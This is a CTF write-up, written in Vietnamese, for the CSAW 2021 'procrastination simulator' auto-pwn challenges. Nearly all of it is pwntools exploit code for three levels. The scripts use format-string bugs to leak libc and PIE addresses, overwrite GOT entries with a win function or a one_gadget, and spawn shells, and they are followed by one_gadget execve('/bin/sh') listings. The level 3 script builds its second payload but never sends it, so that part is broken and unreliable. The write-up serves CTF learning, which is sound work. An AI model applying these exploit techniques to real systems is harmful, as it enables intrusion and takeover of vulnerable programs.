# Writeup csaw 2021
#   Author: shawking
> # Challenge Name : procrastination simulator
Vì sau khi kết thúc giải họ đã đóng server ngay nên mình cũng ko kịp chụp lại hình ảnh nên chỉ tóm tắt và giải thích payload. 

khi ta kết nối vào server sẽ yêu cầu ta nhập password mà tác giả cho trước. Sau đó chuong trình sẽ in ra hexdump binary như sau:

![screenshot](https://github.com/shawking2/Writeup/blob/main/Csaw/2021/procrastination-simulator/img/img1.png)

Ta sẽ lấy bản hexdump này về dùng ```xxd -r``` để convert nó sang binary. Sẽ có 3 challenge giống nhau như vậy. Các chương trình này chỉ khác nhau ở địa chỉ hàm ```win```. Khi ta lên shell thành công chương trình sẽ cung cấp ip , port và password cho challenge tiếp theo. Ở bài này ta tồn tại lỗi fomat string nên ta chỉ vần overwrite got_exit bằng địa chỉ hàm win ta sẽ có được shell. Code khai thac level1:
```
from pwn import *
import os
passw = '0619b9a41fcc3e30b1e0cc206d58c37e'
port = 11001

while(1):
    p = remote("auto-pwn.chal.csaw.io",port)

    p.sendlineafter("> ",passw)

    p.recvline()
    p.recvline()
    p.recvline()

    leak = p.recvuntil("-------------------------------------------------------------------\n")[:-68]
    open('challenge', 'wb').write(leak)
    os.system("cat challenge | xxd -r > done_file")

    elf = ELF("./done_file")

    got_exit = elf.symbols['got.exit']
    win = elf.symbols['win'] - 0x08040000
    payload = b'AA'
    payload += b'%' #40558c' #40560 40855c
    payload +=  str(win-2).encode('utf-8')#leak-2)
    payload += b'c'
    payload += b'%10$hn'
    payload = payload.ljust(0x10 + 2, b'A')
    payload += p64(got_exit)
    p.sendlineafter("> ",payload)


    p.sendline("cat message.txt")
    p.recvuntil("auto-pwn.chal.csaw.io ")
    port = int(p.recv(5),10)

    p.recvuntil("password ")
    passw = p.recv(32)
    print(passw)
    os.system("rm -r done_file")
p.interactive()

```
Ở level2 cách thức cũng  giống như trên nhưng tác giả sẽ đổi binary với cách khai thác giống  đến challenge 46. Ở lv2 thì tác giả chuyển sang file binary 64 bit. Ở loại challenge này có lỗi format string gần giống như trên  mình overwrite got_puts bằng one_gadget (chỉ 3 byte cuối). Code khai thác :

```
from pwn import *
import os

libc = ELF("./libc6_2.24-11+deb9u4_amd64.so")
passw = '676b8b041ae5640ba189fe0fa12a0fe3'
port = 11031
context.clear(arch = 'amd64')

while(1):
    p = remote("auto-pwn.chal.csaw.io",port)


    p.sendlineafter("> ",passw)

    p.recvline()
    p.recvline()
    p.recvline()

    leak = p.recvuntil("-------------------------------------------------------------------\n")[:-68]
    open('challenge', 'wb').write(leak)
    os.system("cat challenge | xxd -r > done_file")

    elf = ELF("./chall31")
    addre_ret = 0x000000000401A98
    need = 0x1a98

    exit = elf.symbols['got.exit']
    fgets = elf.symbols['got.fgets']
    printf = elf.symbols['got.printf']
    puts = elf.symbols['got.puts']
    fflush = elf.symbols['got.fflush']

    #off = 6
    payload = b'++%10$s+' #6
    payload += b'__%11$s_' #7
    payload += b'%' #8
    payload += str(need-0x12).encode('utf-8') #9
    payload += b'c' 
    payload += b'%12$hn' 
    payload = payload.ljust(0x20,b'A')
    payload += p64(fgets)   #10
    payload += p64(printf)   #11
    payload += p64(exit)   #12
    #raw_input("DEBUG")
    p.sendline(payload)

    p.recvuntil("++")
    fgets = u64(p.recv(6).ljust(0x8, b'\x00'))
    p.recvuntil("__")
    printf = u64(p.recv(6).ljust(0x8, b'\x00'))
    success("fgets: " + hex(fgets))
    success("printf: " + hex(printf))

    libc_base = fgets - libc.symbols['fgets']
    success("libc_base: " + hex(libc_base))
    one_gadget = libc_base + 0xd6b9f
    success("one_gadget: " + hex(one_gadget))


    bin_sh1 = 0x7368 
    bin_sh2 = 0x6e2f 
    bin_sh3 = 0x2f6269 

    t1 = one_gadget & 0xff
    t2 = one_gadget & 0xffff00
    t2 = t2 >> 8

    payload = b'%'
    payload += str(t1).encode('utf-8')
    payload += b'c'
    payload += b'%10$hhn'
    payload += b'%'
    payload += str(t2 - t1).encode('utf-8')
    payload += b'c'
    payload += b'%11$hn'
    payload = payload.ljust(0x20,b'A')
    payload += p64(puts)
    payload += p64(puts+1)
    payload += b'\x00'*0x100

    p.sendline(payload)

    p.sendline("cat message.txt")
    p.recvuntil("auto-pwn.chal.csaw.io ")
    port = int(p.recv(5),10)

    p.recvuntil("password ")
    passw = p.recv(32)
    print(passw)
    os.system("rm -r done_file")


p.interactive()

"""
0x3f306 execve("/bin/sh", rsp+0x30, environ)
constraints:
  rax == NULL

0x3f35a execve("/bin/sh", rsp+0x30, environ)
constraints:
  [rsp+0x30] == NULL

0xd6b9f execve("/bin/sh", rsp+0x60, environ)
constraints:
  [rsp+0x60] == NULL
"""
```
Tiếp theo là Lv3. Ở level này thì vẫn khá giống level2 lỗi format string xảy ra. Chỉ khác 1 tí là pie enable. Nên ta sẽ leak thêm pie và overwite got_puts như level2. Code khai thác lv3:
```
from pwn import *

from pwn import *
import os

libc = ELF("./libc6_2.31-0ubuntu9.1_amd64.so")
#libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
passw = 'f24893e242786db36cb37939ad0a90ff'
port = 11046
context.clear(arch = 'amd64')

while(1):
    p = remote("auto-pwn.chal.csaw.io",port)
    p.sendlineafter("> ",passw)


    p.recvline()
    p.recvline()
    p.recvline()

    leak = p.recvuntil("-------------------------------------------------------------------\n")[:-68]
    open('challenge', 'wb').write(leak)
    os.system("cat challenge | xxd -r > done_file")



    elf = ELF("./done_file")
    addre_ret = 0x000000000401A98
    need = 0x1a98


    payload = b'%30$p__%35$p'

    p.sendline(payload)
    p.recvuntil("Report 1:\n")

    libc_base = int(p.recv(14),16) - libc.symbols['_IO_file_jumps']
    p.recvuntil("__")
    pie = int(p.recv(14),16) - 0x15a2
    success("libc_base: " + hex(libc_base))
    success("pie: " + hex(pie))

    one_gadget = libc_base + 0xe6c81
    got_fflush = pie + 0x36d0
    success("got_fflush: " + hex(got_fflush))
    got_puts = pie + 0x3698


    t1 = one_gadget & 0xff
    t2 = one_gadget & 0xffff00
    t2 = t2 >> 8

    payload = b'%'
    payload += str(t1).encode('utf-8')
    payload += b'c'
    payload += b'%12$hhn'
    payload += b'%'
    payload += str(t2 - t1).encode('utf-8')
    payload += b'c'
    payload += b'%13$hn'
    payload = payload.ljust(0x20,b'A')
    payload += p64(got_fflush)
    payload += p64(got_fflush+1)
    payload += b'\x00'*0x100


    p.sendline("cat message.txt")
    p.recvuntil("auto-pwn.chal.csaw.io ")
    port = int(p.recv(5),10)

    p.recvuntil("password ")
    passw = p.recv(32)
    print(passw)
    os.system("rm -r done_file")







p.interactive()



"""
0xe6c7e execve("/bin/sh", r15, r12)
constraints:
  [r15] == NULL || r15 == NULL
  [r12] == NULL || r12 == NULL

0xe6c81 execve("/bin/sh", r15, rdx)
constraints:
  [r15] == NULL || r15 == NULL
  [rdx] == NULL || rdx == NULL

0xe6c84 execve("/bin/sh", rsi, rdx)
constraints:
  [rsi] == NULL || rsi == NULL
  [rdx] == NULL || rdx == NULL

"""
```
> Flag: ```flag{c0ngr4tul4t10ns,4ut0-pwn3r!5h0ut0ut5_t0_UTCTF_f0r_th31r_3xc3ll3nt_AEG_ch4ll3ng3_1n_M4y}```


